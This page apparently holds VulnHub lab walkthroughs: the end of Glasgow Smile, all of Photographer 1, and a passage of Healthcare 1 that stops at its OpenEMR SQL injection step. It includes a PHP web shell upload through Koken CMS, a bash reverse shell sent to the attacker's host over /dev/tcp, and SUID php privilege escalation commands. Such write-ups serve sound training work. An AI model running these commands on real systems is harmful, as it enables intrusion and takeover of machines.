<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.165] 40602
python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
root@glasgowsmile:~# <span class="nb">ls
ls
</span>root.txt  <span class="nb">whoami
</span>root@glasgowsmile:~# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You<span class="s1">'ve got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee

</span></code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Photographer 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This machine was developed to prepare for OSCP.</p>

<p><strong>Author:</strong> v1n1v131r4</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get the two flags: user.txt and proof.txt.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/photographer-1,519/">https://www.vulnhub.com/entry/photographer-1,519/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>An ICMP request detected the target machine on the local network, the script that I developed you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.164 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan was performed to the target machine with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">--open</span> <span class="nt">-T5</span> 192.168.179.164 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>On open ports service detection and script scanning was done with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,139,445,8000 192.168.179.164 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
8000/tcp open  ssl/http-alt Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-generator: Koken 0.22.24
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: daisa ahomi
MAC Address: 00:0C:29:8C:2B:76 <span class="o">(</span>VMware<span class="o">)</span>
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: <span class="nt">-3h19m59s</span>, deviation: 2h53m12s, median: <span class="nt">-5h00m00s</span>
| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
| Names:
|   PHOTOGRAPHER&lt;00&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   PHOTOGRAPHER&lt;03&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   PHOTOGRAPHER&lt;20&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery:
|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER<span class="se">\x</span>00
|   Domain name: <span class="se">\x</span>00
|   FQDN: photographer
|_  System <span class="nb">time</span>: 2021-11-12T08:30:16-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2021-11-12T13:30:16
|_  start_date: N/A
</code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>

<p>Enumerating the shared folders I found the resource sambashare.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient <span class="nt">-L</span> 192.168.179.164 <span class="nt">-N</span>       

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>photographer server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
</code></pre></div></div>

<p>With a null session it was possible to access the resource sambashere, there are two files inside this directory, and I downloaded them to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient //192.168.179.164/sambashare <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Mon Jul 20 20:30:07 2020
  ..                                  D        0  Tue Jul 21 04:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 20:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 20:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: <span class="se">\&gt;</span> get mailsent.txt
getting file <span class="se">\m</span>ailsent.txt of size 503 as mailsent.txt <span class="o">(</span>7.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 7.2 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span> get wordpress.bkp.zip
getting file <span class="se">\w</span>ordpress.bkp.zip of size 13930308 as wordpress.bkp.zip <span class="o">(</span>3206.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3156.5 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<p>In the mailsent.txt file, there is a email for Daisa reminding her that not to forget the secret, that appears to be babygirl.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>mailsent.txt 
Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
Date: Mon, 20 Jul 2020 11:40:36 <span class="nt">-0400</span>
From: Agi Clarence &lt;agi@photographer.com&gt;
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> U<span class="p">;</span> Windows NT 5.1<span class="p">;</span> en-US<span class="p">;</span> rv:1.0.1<span class="o">)</span> Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi &lt;daisa@photographer.com&gt;
Subject: To Do - Daisa Website<span class="s1">'s
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don'</span>t forget your secret, my babygirl <span class="p">;</span><span class="o">)</span>
</code></pre></div></div>

<h3 id="web-enumeration-on-port-8000">Web Enumeration on port 8000</h3>

<p>The web service on port 8000 is Koken 0.22.24 as we can see in the nmap output, this contains a File Upload Authenticated vulnerability, to exploit this issue we need to log in first, googling I found the path of the login form, /admin.</p>

<p><img src="/assets/images/photographer/screenshot-1.png" alt="" /></p>

<p>Daisa’s email and password can be found in the mailsent.txt file, so logged in with those credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daisa@photographer.com:babygirl
</code></pre></div></div>

<p><img src="/assets/images/photographer/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/photographer/screenshot-3.png" alt="" /></p>

<p>As we can see, it contains a text file with the instructions on how to exploit the vulnerability.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit Koken
<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
 Exploit Title                                                            |  Path
<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
Koken CMS 0.22.24 - Arbitrary File Upload <span class="o">(</span>Authenticated<span class="o">)</span>                 | php/webapps/48706.txt
<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="arbitrary-file-upload">Arbitrary File Upload</h3>

<p>The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.</p>

<p>We need to create a malicious PHP file as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'&lt;?php system($_GET["cmd"]);?&gt;'</span> <span class="o">&gt;</span> image.php.jpg
</code></pre></div></div>

<p>Then, go to Koken CMS Dashboard, upload your file on “Import Content” button (Library panel) and send the HTTP request to Burp.</p>

<p><img src="/assets/images/photographer/screenshot-4.png" alt="" /></p>

<p>On Burp, rename your file to “image.php”.</p>

<p><img src="/assets/images/photographer/screenshot-5.png" alt="" /></p>

<p>On Koken site click on “Timeline” and click on “Download File” to see where your file is hosted on server.</p>

<p><img src="/assets/images/photographer/screenshot-6.png" alt="" /></p>

<p>As we can see our malicious PHP code was uploaded and we can execute system commands.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.164:8000/storage/originals/bc/b3/image.php?cmd<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>We set up a netcat listener and run the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.164:8000/storage/originals/bc/b3/image.php?cmd<span class="o">=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span><span class="si">)</span>
</code></pre></div></div>

<p>We have a shell with www-data privileges, and upgraded it to a full tty shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script <span class="nt">-qc</span> /bin/bash /dev/null
Ctrl + z
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg
export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.164] 46838
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1192<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@photographer:/var/www/html/koken/storage/originals/bc/b3<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
&lt;www/html/koken/storage/originals/bc/b3<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
www-data@photographer:/var/www/html/koken/storage/originals/bc/b3<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443
columns 164otographer:/var/www/html/koken/storage/originals/bc/b3<span class="nv">$ </span><span class="nb">stty </span>rows 39  
www-data@photographer:/var/www/html/koken/storage/originals/bc/b3<span class="err">$</span>
</code></pre></div></div>

<p>Listing the SUID binaries, an uncommon PHP executable has those permissions, so we can abuse it to escalate privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/home/agi/share<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
...
/usr/bin/php7.2
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID Binary</h3>

<p>To get root I used the PHP function <strong>pcntl_exec</strong> that executes specified program in current process space maintaining the permissions of the binary, this was extracted from the <a href="https://gtfobins.github.io/gtfobins/php/#suid">GTFOBINS</a> guide.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/home/agi/share<span class="nv">$ </span>/usr/bin/php7.2 <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="c"># python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'</span>
root@photographer:/home/agi/share# <span class="nb">cd</span> /root/
root@photographer:/root# <span class="nb">ls
</span>proof.txt
root@photographer:/root# <span class="nb">cat </span>proof.txt 
                                                                   
                                .:/://::::///:-<span class="sb">`</span>                                
                            -/++:+<span class="sb">`</span>:--:o:  oo.-/+/:<span class="sb">`</span>                            
                         -++-.<span class="sb">`</span>o++s-y:/s: <span class="sb">`</span>sh:hy<span class="sb">`</span>:-/+:<span class="sb">`</span>                         
                       :o:<span class="sb">``</span>oyo/o<span class="sb">`</span><span class="nb">.</span> <span class="sb">`</span>      <span class="sb">```</span>/-so:+--+/<span class="sb">`</span>                       
                     <span class="nt">-o</span>:-<span class="sb">`</span>yh//.                 <span class="sb">`</span>./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o<span class="sb">`</span>                    
                   o/ :yo-:hNN                   .MNs./+o--s<span class="sb">`</span>                   
                  ++ soh-/mMMN--.<span class="sb">`</span>            <span class="sb">`</span>.-/MMMd-o:+ <span class="nt">-s</span>                   
                 .y  /++:NMMMy-.<span class="sb">``</span>            <span class="sb">``</span>-:hMMMmoss: +/                  
                 s-     hMMMN<span class="sb">`</span> shyo+:.    -/+syd+ :MMMMo     h                  
                 h     <span class="sb">`</span>MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     <span class="sb">`</span>MMMMMMd<span class="sb">`</span>/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:<span class="sb">````</span>  <span class="sb">`</span>mmNh   <span class="sb">```</span>./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ <span class="sb">`</span>s-:o  sdmmmmMMMMN.     h<span class="sb">`</span>                 
                 :o      sMMMMMMMMs.        <span class="nt">-hMMMMMMMM</span>/     :o                  
                  s:     <span class="sb">`</span>sMMMMMMMo - <span class="nb">.</span> <span class="sb">`</span><span class="nb">.</span> <span class="nb">.</span> hMMMMMMN+     <span class="sb">`</span>y<span class="sb">`</span>                  
                  <span class="sb">`</span>s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     <span class="sb">`</span>s-                   
                   <span class="sb">`</span>s:    <span class="nt">--</span>.sNMMMMMMMMMMMMMMMMMMmo/.    <span class="nt">-s</span><span class="nb">.</span>                    
                     /o.<span class="sb">`</span>ohd:<span class="sb">`</span>.odNMMMMMMMMMMMMNh+.:os/ <span class="sb">`</span>/o<span class="sb">`</span>                     
                      .++-<span class="sb">`</span>+y+/:<span class="sb">`</span>/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:<span class="sb">`</span>:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:<span class="sb">`</span>                           
                              <span class="sb">`</span>-///////////////:<span class="sb">`</span>                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Healthcare 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This machine was developed to train the student to think according to the OSCP methodology. Pay attention to each step, because if you lose something you will not reach the goal, to become root in the system.</p>

<p><strong>Author:</strong> v1n1v131r4</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/healthcare-1,522/">https://www.vulnhub.com/entry/healthcare-1,522/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>An ARP scan discovered the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.163 00:0c:29:d7:88:3c       VMware, Inc.
192.168.179.254 00:50:56:e2:c4:84       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan discovered two available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T5</span> <span class="nt">-p-</span> 192.168.179.163 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning was performed on the target machine with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,80 <span class="nt">-v</span> <span class="nt">-n</span> 192.168.179.163 <span class="nt">-oN</span> nmap/service-enum.txt
...
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 <span class="o">((</span>PCLinuxOS 2011/PREFORK-1pclos2011<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 <span class="o">(</span>PCLinuxOS 2011/PREFORK-1pclos2011<span class="o">)</span>
|_http-title: Coming Soon 2
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>On the main page I don’t found anything, so I decided check the robots file but it was equally irrelevant.</p>

<p><img src="/assets/images/healthcare/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/healthcare/screenshot-2.png" alt="" /></p>

<p>Scanning with nikto reveals a possible shellshock vulnerability.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nikto <span class="nt">-h</span> http://192.168.179.163
- Nikto v2.1.6
<span class="nt">---------------------------------------------------------------------------</span>
+ Target IP:          192.168.179.163
+ Target Hostname:    192.168.179.163
+ Target Port:        80
+ Start Time:         2021-11-08 08:53:53 <span class="o">(</span>GMT-5<span class="o">)</span>
<span class="nt">---------------------------------------------------------------------------</span>
+ Server: Apache/2.2.17 <span class="o">(</span>PCLinuxOS 2011/PREFORK-1pclos2011<span class="o">)</span>
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 01:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
+ <span class="s2">"robots.txt"</span> contains 8 entries which should be manually viewed.
+ Uncommon header <span class="s1">'tcn'</span> found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15. The following alternatives <span class="k">for</span> <span class="s1">'index'</span> were found: index.html
+ Apache/2.2.17 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the <span class="s1">'shellshock'</span> vulnerability <span class="o">(</span>http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6271<span class="o">)</span><span class="nb">.</span>
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the <span class="s1">'shellshock'</span> vulnerability <span class="o">(</span>http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6278<span class="o">)</span><span class="nb">.</span>
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 9548 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 13 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+ End Time:           2021-11-16 09:00:53 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span>420 seconds<span class="o">)</span>
<span class="nt">---------------------------------------------------------------------------</span>
</code></pre></div></div>

<p>I tried to exploit shellshock but wasn’t possible, this looks like a rabbit hole.</p>

<p><img src="/assets/images/healthcare/screenshot-3.png" alt="" /></p>

<p>Further enumeration with gobuster reveals the openemr directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.163/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-e</span> 
...
http://192.168.179.163/index                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5031]
http://192.168.179.163/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 346] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/images/]
http://192.168.179.163/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 343] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/css/]   
http://192.168.179.163/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 342] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/js/]    
http://192.168.179.163/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 346] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/vendor/]
http://192.168.179.163/favicon              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1406]                                    
http://192.168.179.163/robots               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 620]                                     
http://192.168.179.163/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 345] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/fonts/] 
http://192.168.179.163/gitweb               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 346] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/gitweb/]
http://192.168.179.163/phpMyAdmin           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 59]                                      
http://192.168.179.163/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 1001]                                    
http://192.168.179.163/server-info          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 1001]                                    
http://192.168.179.163/openemr              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 347] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.163/openemr/]
</code></pre></div></div>

<p>OpenEMR is free, open source software for the health care industry, integrates medical practice management, electronic medical record (EMR) patient scheduling and electronic billing functionality.</p>

<p><img src="/assets/images/healthcare/screenshot-4.png" alt="" /></p>

<p>I looked for a known vulnerability for this version and a SQL Injection was found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit openemr 4.1.0
<span class="nt">-----------------------------------------------------------</span> <span class="nt">--------------------------</span>
 Exploit Title                                             |  Path
<span class="nt">-----------------------------------------------------------</span> <span class="nt">--------------------------</span>
OpenEMR 4.1.0 - <span class="s1">'u'</span> SQL Injection                          | php/webapps/49742.py
Openemr-4.1.0 - SQL Injection                              | php/webapps/17998.txt
<span class="nt">-----------------------------------------------------------</span> <span class="nt">--------------------------</span>
</code></pre></div></div>

<p>So, I copied the python exploit to my current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/49742.py
root@kali:~<span class="nv">$ </span><span class="nb">cp </span>49742.py exp.py
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>I analyzed the script, we just need to replace the IP address with the target machine’s ip.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/192.168.56.106/192.168.179.163/'</span> exp.py 
root@kali:~<span class="nv">$ </span><span class="nb">grep </span>192 exp.py                                
url <span class="o">=</span> <span class="s2">"http://192.168.179.163/openemr/interface/login/validateUser.php?u="</span>
</code></pre></div></div>

